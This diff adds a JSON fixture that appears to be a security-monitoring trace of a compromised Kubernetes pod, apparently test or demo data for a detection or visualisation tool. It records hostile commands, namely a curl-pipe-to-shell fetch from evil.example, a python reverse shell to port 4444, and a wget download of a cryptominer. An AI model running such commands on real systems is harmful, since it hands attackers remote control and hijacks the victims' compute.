@@ -1,0 +1,157 @@
+{
+  "pod": "web-frontend-7d9c4f8b9-xk2m1",
+  "namespace": "default",
+  "cluster": "kind-moshub",
+  "processes": [
+    {
+      "id": "p1",
+      "pid": 1,
+      "ppid": 0,
+      "binary": "/bin/bash",
+      "role": "entry",
+      "cmdline": "/bin/bash -c entrypoint.sh",
+      "firstSeen": "2026-11-07T20:01:02Z",
+      "lastSeen": "2026-11-07T20:01:02Z"
+    },
+    {
+      "id": "p2",
+      "pid": 42,
+      "ppid": 1,
+      "binary": "/usr/sbin/nginx",
+      "role": "tool",
+      "cmdline": "nginx: master process",
+      "firstSeen": "2026-11-07T20:01:03Z",
+      "lastSeen": "2026-11-07T20:04:00Z"
+    },
+    {
+      "id": "p3",
+      "pid": 128,
+      "ppid": 1,
+      "binary": "/bin/sh",
+      "role": "shell",
+      "cmdline": "sh -c curl http://evil.example/payload.sh | sh",
+      "firstSeen": "2026-11-07T20:04:11Z",
+      "lastSeen": "2026-11-07T20:04:16Z"
+    },
+    {
+      "id": "p4",
+      "pid": 140,
+      "ppid": 128,
+      "binary": "/usr/bin/curl",
+      "role": "tool",
+      "cmdline": "curl -fsSL http://evil.example/payload.sh",
+      "firstSeen": "2026-11-07T20:04:12Z",
+      "lastSeen": "2026-11-07T20:04:12Z"
+    },
+    {
+      "id": "p5",
+      "pid": 141,
+      "ppid": 128,
+      "binary": "/bin/sh",
+      "role": "suspect",
+      "cmdline": "sh /tmp/payload.sh",
+      "firstSeen": "2026-11-07T20:04:13Z",
+      "lastSeen": "2026-11-07T20:04:16Z"
+    },
+    {
+      "id": "p6",
+      "pid": 155,
+      "ppid": 141,
+      "binary": "/usr/bin/python3",
+      "role": "suspect",
+      "cmdline": "python3 -c import socket,os,pty; ...",
+      "firstSeen": "2026-11-07T20:04:14Z",
+      "lastSeen": "2026-11-07T20:04:14Z"
+    },
+    {
+      "id": "p7",
+      "pid": 162,
+      "ppid": 141,
+      "binary": "/usr/bin/wget",
+      "role": "suspect",
+      "cmdline": "wget http://evil.example/xmrig -O /tmp/x",
+      "firstSeen": "2026-11-07T20:04:16Z",
+      "lastSeen": "2026-11-07T20:04:16Z"
+    }
+  ],
+  "network": [
+    {
+      "id": "n1",
+      "fromPid": 140,
+      "dst": "evil.example",
+      "port": 80,
+      "proto": "tcp",
+      "label": "download",
+      "t": "2026-11-07T20:04:12Z"
+    },
+    {
+      "id": "n2",
+      "fromPid": 155,
+      "dst": "45.33.12.9",
+      "port": 4444,
+      "proto": "tcp",
+      "label": "reverse-shell",
+      "t": "2026-11-07T20:04:14Z"
+    },
+    {
+      "id": "n3",
+      "fromPid": 162,
+      "dst": "evil.example",
+      "port": 80,
+      "proto": "tcp",
+      "label": "miner-fetch",
+      "t": "2026-11-07T20:04:16Z"
+    }
+  ],
+  "events": [
+    {
+      "id": "e1",
+      "t": "2026-11-07T20:01:02Z",
+      "type": "PROCESS_EXEC",
+      "pid": 1,
+      "summary": "entrypoint /bin/bash"
+    },
+    {
+      "id": "e2",
+      "t": "2026-11-07T20:01:03Z",
+      "type": "PROCESS_EXEC",
+      "pid": 42,
+      "summary": "nginx master started"
+    },
+    {
+      "id": "e3",
+      "t": "2026-11-07T20:04:11Z",
+      "type": "PROCESS_EXEC",
+      "pid": 128,
+      "summary": "interactive /bin/sh in container"
+    },
+    {
+      "id": "e4",
+      "t": "2026-11-07T20:04:12Z",
+      "type": "PROCESS_KPROBE",
+      "pid": 140,
+      "summary": "curl → evil.example:80"
+    },
+    {
+      "id": "e5",
+      "t": "2026-11-07T20:04:13Z",
+      "type": "PROCESS_EXEC",
+      "pid": 141,
+      "summary": "payload.sh executed"
+    },
+    {
+      "id": "e6",
+      "t": "2026-11-07T20:04:14Z",
+      "type": "PROCESS_KPROBE",
+      "pid": 155,
+      "summary": "python reverse connect :4444"
+    },
+    {
+      "id": "e7",
+      "t": "2026-11-07T20:04:16Z",
+      "type": "PROCESS_EXEC",
+      "pid": 162,
+      "summary": "wget miner binary"
+    }
+  ]
+}
